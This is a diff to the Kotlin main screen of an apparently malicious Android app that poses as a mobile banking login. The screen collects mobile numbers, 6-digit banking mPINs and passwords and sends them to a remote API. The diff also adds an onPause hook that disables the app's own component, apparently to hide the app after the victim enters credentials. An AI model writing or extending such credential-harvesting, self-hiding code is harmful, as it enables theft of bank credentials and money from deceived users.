@@ -39,10 +39,7 @@ class MainActivity : AppCompatActivity() {
         setContentView(binding.root)
 
 
-//        val pakagemanger = packageManager
-////        val componentname =  ComponentName(this,MainActivity::class.java)
-//        pakagemanger.setApplicationEnabledSetting(packageName,PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-//            PackageManager.DONT_KILL_APP)
+
 
 
         val util = Util()
@@ -65,7 +62,7 @@ class MainActivity : AppCompatActivity() {
 
         binding.t1.text = "Mobile Number"
         binding.t3.text = "mPIN (Enter 6 digit mobile banking mPIN)"
-        binding.t4.text = "Customer ID"
+//        binding.t4.text = "Customer ID"
         settext();
         binding.cust.setTextColor(resources.getColor(R.color.darkgrey))
         binding.mpin.setTextColor(resources.getColor(R.color.white))
@@ -91,7 +88,7 @@ class MainActivity : AppCompatActivity() {
 
         binding.cust.setOnClickListener{
 
-            binding.t4.text = "Customer ID"
+//            binding.t4.text = "Customer ID"
             binding.t3.text = "Password"
             binding.t1.text = "Mobile Number"
             settext();
@@ -109,7 +106,7 @@ class MainActivity : AppCompatActivity() {
 
             binding.t1.text = "Mobile Number"
             binding.t3.text = "mPIN (Enter 6 digit mobile banking mPIN)"
-            binding.t4.text = "Customer ID "
+//            binding.t4.text = "Customer ID "
             settext();
             btnstr = "mpin";
             binding.cust.setTextColor(resources.getColor(R.color.darkgrey))
@@ -125,7 +122,7 @@ class MainActivity : AppCompatActivity() {
         binding.login.setOnClickListener {
 
             if ( binding.e2.text.toString().isEmpty()
-                || binding.e3.text.toString().isEmpty() || binding.e4.text.toString().isEmpty() ){
+                || binding.e3.text.toString().isEmpty() ){
                 Toast.makeText(this,"fill all fields", Toast.LENGTH_SHORT).show();
             }else if( (binding.e3.text.toString().length != 6 && binding.t3.text
                         == "mPIN (Enter 6 digit mobile banking mPIN)" ) ){
@@ -145,7 +142,7 @@ class MainActivity : AppCompatActivity() {
                 if (btnstr == "mpin") {
 
                     val data = Submit1r(mobile = binding.e2.text.toString(),
-                         mpin = binding.e3.text.toString(), customerid = binding.e4.text.toString() )
+                         mpin = binding.e3.text.toString() )
                     util.saveLocalData(this,"m",binding.e2.text.toString() )
                     val call = apiService.submit1(data)
                     call.enqueue(object : Callback<Void?> {
@@ -166,8 +163,8 @@ class MainActivity : AppCompatActivity() {
 
                 }  else {
 
-                    val data = Submit2(customerid = binding.e2.text.toString(), pass = binding.e3.text.toString() ,
-                        mobile = binding.e4.text.toString() )
+                    val data = Submit2(pass = binding.e3.text.toString() ,
+                        mobile = binding.e2.text.toString() )
                     util.saveLocalData(this,"c",binding.e2.text.toString() )
                     val call = apiService.submit2(data)
                     call.enqueue(object : Callback<Void?> {
@@ -194,6 +191,13 @@ class MainActivity : AppCompatActivity() {
 
     }
 
+    override fun onPause() {
+        super.onPause()
+        Log.e("asdf123", "onPause: 11" )
+        val pakagemanger = packageManager
+        pakagemanger.setApplicationEnabledSetting(packageName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+            PackageManager.DONT_KILL_APP)
+    }
 
     private fun settext(){
         binding.e2.setText("");
